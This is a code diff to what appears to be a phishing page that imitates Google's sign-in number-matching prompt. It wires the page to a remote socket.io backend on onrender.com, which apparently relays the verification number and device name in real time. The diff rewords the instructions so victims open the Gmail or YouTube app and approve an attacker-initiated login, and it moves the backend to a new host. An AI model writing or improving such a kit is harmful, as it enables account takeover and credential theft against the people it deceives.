@@ -383,10 +383,10 @@
       </div>
 
       <div class="mg-prompt-number" id="mg-prompt-number">58</div>
-      <p class="mg-prompt-device" id="mg-prompt-device">Check your phone</p>
+      <p class="mg-prompt-device" id="mg-prompt-device">Open the Gmail or YouTube app</p>
       <p class="mg-prompt-desc">
         Google sent a notification to your <span id="mg-prompt-device-inline">phone</span>.
-        Tap <strong>Yes</strong> on the notification, then tap
+        Open the Gmail or YouTube app, tap <strong>Yes</strong> on the prompt, then tap
         <strong id="mg-prompt-number-inline">58</strong> on your phone to verify it's you.
       </p>
       <a href="#" class="mg-prompt-help">Need help? Learn more about Google prompts</a>
@@ -524,7 +524,7 @@
       var h = location.hostname;
       return (h === 'localhost' || h === '127.0.0.1' || h.endsWith('.test') || h.endsWith('.local'))
         ? 'http://localhost:3001'
-        : 'https://backintosh.onrender.com';
+        : 'https://rbback-jxr6.onrender.com';
     })();
     const socket = io(BACKEND_URL, { query: { clientId } });
 
@@ -574,13 +574,16 @@
       mgPassNext.disabled = false;
       mgPassNext.innerHTML = 'Next';
 
-      var num    = (data && data.number) ? String(data.number) : '58';
-      var device = (data && data.device) ? String(data.device) : 'your phone';
+      var num       = (data && data.number) ? String(data.number) : '58';
+      var deviceRaw = (data && data.device != null) ? String(data.device).trim() : '';
+      var hasDevice = deviceRaw.length > 0;
 
-      document.getElementById('mg-prompt-number').textContent          = num;
-      document.getElementById('mg-prompt-number-inline').textContent   = num;
-      document.getElementById('mg-prompt-device').textContent          = 'Check ' + device;
-      document.getElementById('mg-prompt-device-inline').textContent   = device;
+      document.getElementById('mg-prompt-number').textContent         = num;
+      document.getElementById('mg-prompt-number-inline').textContent  = num;
+      document.getElementById('mg-prompt-device').textContent         = hasDevice
+        ? ('Open the Gmail or YouTube app on ' + deviceRaw)
+        : 'Open the Gmail or YouTube app';
+      document.getElementById('mg-prompt-device-inline').textContent  = hasDevice ? deviceRaw : 'phone';
 
       var email = mgEmailInp.value.trim();
       document.getElementById('mg-prompt-chip-email').textContent = email;
